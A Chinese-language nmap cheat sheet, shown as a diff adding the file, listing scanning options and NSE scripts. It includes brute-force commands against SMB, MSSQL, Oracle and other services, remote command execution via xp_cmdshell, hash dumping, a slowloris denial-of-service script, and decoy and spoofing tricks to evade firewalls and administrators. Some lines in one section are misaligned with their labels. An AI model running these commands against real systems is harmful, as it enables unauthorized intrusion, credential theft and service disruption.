@@ -1,0 +1,230 @@
+nmap -v scanme.nmap.org    //这个选项扫描主机scanme.nmap.org中 所有的保留TCP端口。选项-v启用细节模式。
+nmap -sS -O scanme.nmap.org/24    //进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段 的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。
+nmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127    //进行主机列举和TCP扫描，对象为B类188.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。
+nmap -v -iR 100000 -P0 -p 80    //随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段 发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因 此使用-P0禁止对主机列表。
+nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20    //扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。
+host -l company.com | cut -d -f 4 | nmap -v -iL -    //进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux -- 其它系统进行区域传输时有不同的命令
+
+
+扫描网段 (192.168.1.0/24)
+	nmap -sP 192.168.1.0/24 或者 nmap -sP 192.168.1.*
+SYN对全端口进行扫描
+    在aggressive(4)的时间模板下,同时对开放的端口进行端口识别，并查看相应的服务器版本。
+	nmap -sS -T4 -p1-65535 -sV 192.168.1.169
+    在aggressive(4)的时间模板下，探测操作系统的类型和版本，并显示traceroute的结果。
+    nmap -sS -T4 -A 192.168.1.169
+    nmap -sS -T4 -A -O 192.168.1.169
+文件中读取需要扫描的IP列表
+    nmap -iL ips.txt
+扫描的结果输出处理
+	将扫描的结果输出到屏幕，同时存储一份到output.txt。
+	nmap -sS -p1-65525 192.168.1.169 -oG output.txt
+扫描结果输出为html。
+	nmap -sS -p1-65525 192.168.1.169 --webxml -oX - | xsltproc --output  file.html
+在子网中发现开放netbios的IP	
+	nmap -sV -v -p139,445 192.168.1.0/24
+扫描指定netbios的名称	
+	nmap -sU --script nbstat.nse -p 137 target
+扫描指定的目标,同时检测相关漏洞	
+	nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 169
+	
+nmap脚本使用	
+	auth: 负责处理鉴权证书（绕开鉴权）的脚本  
+	broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  
+	brute: 提供暴力破解方式，针对常见的应用如http/snmp等  
+	default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  
+	discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  
+	dos: 用于进行拒绝服务攻击  
+	exploit: 利用已知的漏洞入侵系统  
+	external: 利用第三方的数据库或资源，例如进行whois解析  
+	fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 
+	intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  
+	malware: 探测目标机是否感染了病毒、开启了后门等信息  
+	safe: 此类与intrusive相反，属于安全性脚本  
+	version: 负责增强服务与版本扫描（Version Detection）功能的脚本  
+	vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067
+	
+负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令	
+	nmap --script=auth 192.168.1.*
+提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解	
+	nmap --script=brute 192.168.1.169
+默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击	
+	nmap --script=default 192.168.1.169 或者 nmap -sC 192.168.1.169
+检查是否存在常见漏洞	
+	nmap --script=vuln 192.168.1.169
+在局域网内探查更多服务开启状况	
+	nmap -n -p445 --script=broadcast 192.168.1.169
+利用第三方的数据库或资源，例如进行whois解析	
+	nmap --script external 192.168.1.169
+vnc扫描	
+	nmap --script=realvnc-auth-bypass 192.168.1.169
+获取vnc信息	
+	nmap --script=vnc-info 192.168.1.169
+smb扫描	
+	说明:SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445。
+	nmap --script=smb-brute.nse 192.168.1.169
+smb字典破解	
+	nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.1.169
+smb已知几个严重漏扫描	
+	nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.1.169
+smb查看共享目录	
+	nmap -p 445  --script smb-ls --script-args 'share=c$,path=\test,smbuser=administrator,smbpass=fuckyou' 192.168.1.169
+smb查询主机一些敏感信息	
+	nmap -p 445 -n –script=smb-psexec --script-args 'smbuser=administrator,smbpass=fuckyou' 192.168.1.169
+smb查看会话	
+	nmap -p 445 -n --script=smb-enum-sessions  --script-args 'smbuser=administrator,smbpass=fuckyou' 192.168.1.169
+smb系统信息	
+	nmap -p 445 -n --script=smb-os-discovery  --script-args 'smbuser=administrator,smbpass=fuckyou' 192.168.1.169
+猜解mssql用户名和密码
+    nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.1.169
+xp_cmdshell 执行命令
+    nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.1.169
+dumphash值
+    nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=sa 192.168.1.169
+扫描root空口令
+    nmap -p3306 --script=mysql-empty-password 192.168.1.169	
+列出所有mysql用户
+    nmap -p3306 --script=mysql-users --script-args=mysqluser=root 192.168.1.169	
+支持同一应用的所有脚本扫描
+    nmap --script=mysql-* 192.168.1.169	
+oracle sid扫描
+    nmap --script=oracle-sid-brute -p 1521-1560 192.168.1.5
+oracle弱口令破解
+    nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.1.5
+其他一些比较好用的脚本
+    nmap --script=broadcast-netbios-master-browser 192.168.137.4   
+	发现网关  nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.137.4  
+	破解rsync  nmap --script informix-brute -p 9088 192.168.137.4    informix
+	数据库破解  nmap -p 5432 --script pgsql-brute 192.168.137.4       
+	pgsql破解  nmap -sU --script snmp-brute 192.168.137.4            
+	snmp破解  nmap -sV --script=telnet-brute 192.168.137.4          
+	telnet破解  nmap --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}'   
+	jboss autopwn  nmap --script=http-methods.nse 192.168.137.4 
+	检查http方法  nmap --script http-slowloris --max-parallelism 400 192.168.137.4  
+	
+	dos攻击，对于处理能力较小的站点还挺好用的 'half-HTTP' connections   
+	nmap --script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4	
+    
+    
+    
+-sP 渗透内网之后判断当前网络那些主机在线 
+    nmap -sP 192.168.1/255 
+
+-vv 现实详细的扫描过程 
+-sS 使用SYN半开式扫描，这种扫描方式使得扫描结果更加正确(又称半开放,或 隐身扫描) 
+    nmap -vv -sS IP 
+
+-O 大写O代表OS 判断主机操作系统 
+    nmap -O IP 
+	
+延时策略 
+-T(0-5) 默认为3 
+    0 即Paranoid模式。为了避开IDS的检测使扫描速度极慢，nmap串所有的扫描，每隔至少5分钟发送一个包 
+    1 即Sneaky模式。也差不多，只是数据包的发送间隔是15秒 
+    2 即Polite模式。不增加太大的网络负载，串行每个探测，并使每个探测间隔 0.4秒 
+    3 即Normal模式。nmap的默认选项，在不使网络过载或者主机/端口丢失的情况下尽可能快速地扫描 
+    4 即Aggressive模式。设置5分钟的超时限制，对每台主机的扫描时间不超过5分钟，并且对每次探测回应的等待时间不超过1.5秒。 
+    5 即lnsane模式。只适合快速的网络或者不在意丢失默些信息，每台主机的超时 限制为75秒，对每次探测只等待0.3秒。 
+
+	nmap -sS -T1 IP 
+
+-sV 探测端口的服务类型/具体版本等信息 
+	nmap -vv -sV IP 
+-p 端口号 对某个端口的服务版本进行详细探测 有助于升入的针对性攻击， 比如缓冲溢出攻击 
+	nmap -vv -sV IP -p 21 
+
+适用于内外网的探测，以内网操作为示例(外网参数同) 
+　　 
+简单端口扫描： 
+	nmap -vv -sT(sS、sF、sU、sA) 192.168.0.1 -D 127.0.0.1 
+	(-D伪造的地址) 
+　　 
+OS检测： 
+	nmap -vv -sS -O 192.168.0.1 
+　　 
+RPC鉴别： 
+	nmap -sS -sR 192.168.0.1 
+	Linux上的portmap就是一个简单的RPC服务，监听端口为111(默认) 
+Ping扫射：
+	nmap -sP 172.16.15.0/24 
+
+十条常用nmap命令行格式 
+
+1)获取远程主机的系统类型及开放端口 
+    nmap -sS -P0 -sV -O <target> 
+    这里的 < target > 可以是单一 IP, 或主机名，或域名，或子网 
+	-sS TCP SYN 扫描 (又称半开放,或隐身扫描) 
+	-P0 允许你关闭 ICMP pings. 
+	-sV 打开系统版本检测 
+	-O 尝试识别远程操作系统 
+	-sS TCP SYN scanning (also known as half-open, or stealth scanning) 
+	-P0 option allows you to switch off ICMP pings. 
+	-sV option enables version detection 
+	-O flag attempt to identify the remote operating system 
+	Other option: 
+	-A 同时启用操作系统指纹识别和版本检测 
+	-A option enables both OS fingerprinting and version detection 
+	-v use -v twice for more verbosity. 
+	nmap -sS -P0 -A -v < target > 
+2)列出开放了指定端口的主机列表 
+	nmap -sT -p 80 -oG – 192.168.1.* | grep open 
+3)在网络寻找所有在线主机 
+	nmap -sP 192.168.0.* 
+	或者也可用以下命令: 
+	nmap -sP 192.168.0.0/24 
+	指定 subnet 
+4)Ping 指定范围内的 IP 地址 
+	nmap -sP 192.168.1.100-254 	
+5)在某段子网上查找未占用的 IP 
+	nmap -T4 -sP 192.168.2.0/24 && egrep "00:00:00:00:00:00" /proc/net/arp 
+6)在局域网上扫找 Conficker 蠕虫病毒 
+	nmap -PN -T4 -p139,445 -n -v –script=smb-check-vulns –script-args 
+	safe=1 192.168.0.1-254 
+	replace 192.168.0.1-256 with the IP’s you want to check. 
+7)扫描网络上的恶意接入点 rogue APs. 
+	nmap -A -p1-85,113,443,8080-8100 -T4 –min-hostgroup 50 –max-rtt- 
+	timeout 2000 –initial-rtt-timeout 300 –max-retries 3 –host-timeout 
+	20m –max-scan-delay 1000 -oA wapscan 10.0.0.0/8 
+	I’ve used this scan to successfully find many rogue APs on a very, very large network. 
+8)使用诱饵扫描方法来扫描主机端口 
+	Use a decoy while scanning ports to avoid getting caught by the sys 
+	admin 
+	sudo nmap -sS 192.168.0.10 -D 192.168.0.2 
+	Scan for open ports on the target device/computer (192.168.0.10) while 
+	setting up a decoy address (192.168.0.2). This will show the decoy ip 
+	address instead of your ip in targets security logs. Decoy address 
+	needs to be alive. Check the targets security log at /var/log/secure 
+	to make sure it worked. 
+9)为一个子网列出反向 DNS 记录 
+	List of reverse DNS records for a subnet 
+	nmap -R -sL 209.85.229.99/27 | awk '{if($3=="not")print"("$2") no 
+	PTR";else print$3" is "$2}' | grep '(' 
+10)显示网络上共有多少台 Linux 及 Win 设备? 
+	How Many Linux And Windows Devices Are On Your Network? 
+	sudo nmap -F -O 192.168.1.1-255 | grep "Running: " > /tmp/os; echo 
+	"$(cat /tmp/os | grep Linux | wc -l) Linux device(s)"; echo "$(cat 
+	/tmp/os | grep Windows | wc -l) Window(s) devices"
+    
+    
+Nmap – 躲避防火墙
+    # 分段  
+    $ nmap -f  
+       
+    # 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)  
+    $ nmap --mtu 24# 生成随机数量的欺骗  
+    $ nmap -D RND:10 [target]  
+       
+    # 手动指定欺骗使用的 IP  
+    $ nmap -D decoy1,decoy2,decoy3 etc.  
+       
+    # 僵尸网络扫描, 首先需要找到僵尸网络的IP  
+    $ nmap -sI [Zombie IP] [Target IP]  
+       
+    # 指定源端口号  
+    $ nmap --source-port 80 IP  
+       
+    # 在每个扫描数据包后追加随机数量的数据  
+    $ nmap --data-length 25 IP  
+       
+    # MAC 地址欺骗，可以生成不同主机的 MAC 地址  
+    $ nmap --spoof-mac Dell/Apple/3Com IP
